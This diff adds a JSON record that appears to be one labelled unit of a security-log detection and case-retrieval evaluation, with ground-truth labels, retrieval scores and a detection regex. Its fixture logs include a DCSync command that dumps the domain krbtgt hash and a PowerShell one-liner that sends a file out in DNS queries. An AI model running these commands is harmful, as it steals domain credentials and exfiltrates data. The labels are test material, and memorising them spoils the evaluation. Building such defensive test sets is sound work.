@@ -1,0 +1,148 @@
+{
+ "unit": 1107,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "DCSync 拉取 krbtgt 哈希（lsadump::dcsync）并 DNS 隧道外传",
+ "sources": [
+  "hids",
+  "hids",
+  "dns",
+  "dns",
+  "dns"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-29 12:22:33",
+   "source": "hids",
+   "log_id": "HID0651176",
+   "content": "lsadump::dcsync /domain:corp.local /user:krbtgt /csv C:\\temp\\d.csv tk.exe <== CORP\\admin <== services.exe",
+   "event_id": "1107-HID0651176"
+  },
+  {
+   "timestamp": "2026-07-29 12:26:03",
+   "source": "hids",
+   "log_id": "HID0651195",
+   "content": "powershell -c Resolve-DnsName (gc d.csv|%{$_.Substring(0,48)}) powershell.exe <== CORP\\admin",
+   "event_id": "1107-HID0651195"
+  },
+  {
+   "timestamp": "2026-07-29 14:50:03",
+   "source": "dns",
+   "log_id": "DNS0634729",
+   "content": "8b9f0a68.qpvzmt-7c41.net A 10.10.41.201",
+   "event_id": "1107-DNS0634729"
+  },
+  {
+   "timestamp": "2026-07-29 14:51:03",
+   "source": "dns",
+   "log_id": "DNS0634734",
+   "content": "32e133b7.qpvzmt-7c41.net A 192.0.2.148",
+   "event_id": "1107-DNS0634734"
+  },
+  {
+   "timestamp": "2026-07-29 14:52:18",
+   "source": "dns",
+   "log_id": "DNS0634741",
+   "content": "24400230.qpvzmt-7c41.net A 10.10.42.236",
+   "event_id": "1107-DNS0634741"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-002",
+   "name": "Tomcat PUT 上传 JSP webshell + DNS C2 心跳",
+   "summary": "PUT 方法把 JSP webshell 写入上传目录 → 应用侧记录 webshell 上传与 exec 标记 → Tomcat 进程派生子 shell 执行探针 → 数小时后 DGA 风格域名突发解析。",
+   "matched_steps": 1,
+   "total_steps": 4,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S4",
+     "action_id": "dga_hex_subdomain_beacon",
+     "label": "DGA 风格子域突发解析",
+     "event_ids": [
+      "1107-DNS0634741"
+     ],
+     "sources": [
+      "dns"
+     ],
+     "generic": true
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 4,
+   "keyword_details": [
+    "probe +4: \\b[0-9a-f]{8}\\.[a-z]{6}-[0-9a-f]{4}\\.net\\s+A\\b"
+   ],
+   "mitre": [
+    "T1190",
+    "T1505.003",
+    "T1071.004"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "before_steps": [
+    "S1",
+    "S2",
+    "S3"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 4,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S4",
+    "label": "DGA 风格子域突发解析",
+    "sources": [
+     "dns"
+    ],
+    "generic": true,
+    "event_ids": [
+     "1107-DNS0634741"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2",
+   "S3"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 4,
+  "mitre": [
+   "T1190",
+   "T1505.003",
+   "T1071.004"
+  ]
+ }
+}
